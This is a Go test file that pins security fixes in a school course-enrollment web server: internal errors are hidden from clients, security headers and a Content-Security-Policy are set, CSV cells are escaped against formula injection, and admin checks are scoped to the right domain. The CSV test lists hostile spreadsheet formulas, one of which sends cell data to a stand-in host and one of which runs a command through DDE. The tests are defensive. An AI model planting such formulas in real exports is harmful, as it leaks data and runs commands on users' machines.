package web //nolint:testpackage

import (
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// The findings of the security pass, each pinned by the thing that
// demonstrated it.

// errPretendConnect stands in for pgx's connection failure, which is
// the leak that motivated the fixed internal-error message.
var errPretendConnect = errors.New("failed to connect")

func TestInternalErrorsDoNotReachTheClient(t *testing.T) {
	t.Parallel()

	// pgx's connect failure is the one that motivated this: it spells
	// out the database user and the database name, and the pool retries
	// it on every request, so a database that is merely down publishes
	// half its credentials to anyone who loads a page.
	secret := fmt.Errorf("%w: host=db.internal user=cca_writer "+
		"database=cca_prod: server error (FATAL: password "+
		"authentication failed)", errPretendConnect)

	app := &Server{} //exhaustruct:ignore
	recorder := httptest.NewRecorder()
	request := httptest.NewRequestWithContext(
		t.Context(), http.MethodGet, "/student/api/courses", nil)

	app.apiInternalError(request, recorder, secret)

	if recorder.Code != http.StatusInternalServerError {
		t.Errorf("status = %d, want 500", recorder.Code)
	}

	body := recorder.Body.String()

	for _, leak := range []string{"cca_writer", "cca_prod", "db.internal", "password"} {
		if strings.Contains(body, leak) {
			t.Errorf("response names %q:\n%s", leak, body)
		}
	}
}

func TestSecurityHeadersAreSet(t *testing.T) {
	t.Parallel()

	handler := securityHeaders(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	recorder := httptest.NewRecorder()
	handler.ServeHTTP(recorder, httptest.NewRequestWithContext(
		t.Context(), http.MethodGet, "/student/", nil))

	for header, want := range map[string]string{
		"X-Content-Type-Options": "nosniff",
		"X-Frame-Options":        "DENY",
		"Referrer-Policy":        "same-origin",
	} {
		if got := recorder.Header().Get(header); got != want {
			t.Errorf("%s = %q, want %q", header, got, want)
		}
	}

	policy := recorder.Header().Get("Content-Security-Policy")
	if policy == "" {
		t.Fatal("no Content-Security-Policy")
	}

	// The two directives whose absence would make the rest decorative:
	// an inline script executing, and the page being framed.
	if strings.Contains(policy, "script-src 'self' 'unsafe-inline'") {
		t.Errorf("script-src allows inline: %s", policy)
	}

	if !strings.Contains(policy, "frame-ancestors 'none'") {
		t.Errorf("no frame-ancestors: %s", policy)
	}

	// connect-src is the directive that decides where a script that got
	// in can send what it read. A scheme-source like "ws:" or "https:"
	// matches any host, so listing one to permit the same-origin event
	// socket — which 'self' already covers — would quietly reopen the
	// exfiltration channel the directive exists to close.
	for directive := range strings.SplitSeq(policy, ";") {
		name, sources, found := strings.Cut(strings.TrimSpace(directive), " ")
		if !found || name != "connect-src" {
			continue
		}

		for source := range strings.FieldsSeq(sources) {
			if strings.HasSuffix(source, ":") {
				t.Errorf("connect-src allows the scheme %q, which matches any host: %s", source, policy)
			}
		}
	}

	// HSTS is the proxy's to make; asserting its absence keeps someone
	// from adding it here without reading why it is not.
	if got := recorder.Header().Get("Strict-Transport-Security"); got != "" {
		t.Errorf("Strict-Transport-Security = %q; it belongs to the TLS terminator", got)
	}
}

func TestExportedCellsCannotBecomeFormulas(t *testing.T) {
	t.Parallel()

	for _, hostile := range []string{
		`=HYPERLINK("https://evil.example/?"&A1,"Click")`,
		`+1+1`,
		`-2+3`,
		`@SUM(A1)`,
		"=cmd|'/c calc'!A0",
	} {
		escaped := csvEscapeCell(hostile)
		if escaped == hostile {
			t.Errorf("%q left as a formula", hostile)
		}

		if lead := escaped[0]; strings.ContainsRune("=+-@", rune(lead)) {
			t.Errorf("%q still starts with %q", escaped, lead)
		}
	}
}

func TestTheFormulaGuardIsInvertible(t *testing.T) {
	t.Parallel()

	// The round trip is the point of the exports, so the guard has to
	// be an encoding rather than a mangling. Includes the cells that
	// collide with the escape itself, which is where a naive strip
	// would start eating characters.
	for _, cell := range []string{
		"", "Sport", "=1+1", "'", "''", "'=1+1", "-", "@", "s22537",
		"Grade 9", "Art & Design", "  ", "\tleading tab",
	} {
		if round := csvUnescapeCell(csvEscapeCell(cell)); round != cell {
			t.Errorf("round trip of %q gave %q", cell, round)
		}
	}
}

func TestASwapCannotNameUnboundedlyManyCourses(t *testing.T) {
	t.Parallel()

	replacing := make([]string, maxReplacing+1)
	for i := range replacing {
		replacing[i] = "COURSE"
	}

	body := selfEnrollmentBody{CourseID: "TARGET", Replacing: replacing}
	if body.validate() == "" {
		t.Errorf("%d replacements accepted", len(replacing))
	}

	// And the ordinary shapes still pass, so the bound is not a wall in
	// front of the feature.
	for _, ok := range []selfEnrollmentBody{
		{CourseID: "TARGET", Replacing: nil},
		{CourseID: "TARGET", Replacing: []string{"A"}},
		{CourseID: "TARGET", Replacing: []string{"A", "B", "C"}},
	} {
		if why := ok.validate(); why != "" {
			t.Errorf("%v refused: %s", ok.Replacing, why)
		}
	}

	if why := (selfEnrollmentBody{CourseID: "", Replacing: nil}).validate(); why == "" {
		t.Error("an empty course_id was accepted")
	}
}

func TestAnAdminEntryWrittenAsAnAddressDoesNotMatchTheOtherDomain(t *testing.T) {
	t.Parallel()

	// The hazard: two school domains, one allowlist. An entry naming a
	// staff address must not be satisfiable by a student account whose
	// localpart happens to match.
	app := &Server{} //exhaustruct:ignore
	app.config.Admins = map[string]struct{}{
		"jsmith@ykpaoschool.cn": {},
	}

	if !app.isAdmin("jsmith@ykpaoschool.cn", "jsmith") {
		t.Error("the named administrator was refused")
	}

	if app.isAdmin("jsmith@stu.ykpaoschool.cn", "jsmith") {
		t.Error("a student account with a matching localpart was made an administrator")
	}

	// The bare-localpart spelling still works, because it is what the
	// deployed configuration uses.
	bare := &Server{} //exhaustruct:ignore
	bare.config.Admins = map[string]struct{}{"jsmith": {}}

	if !bare.isAdmin("jsmith@ykpaoschool.cn", "jsmith") {
		t.Error("a bare localpart entry stopped working")
	}
}
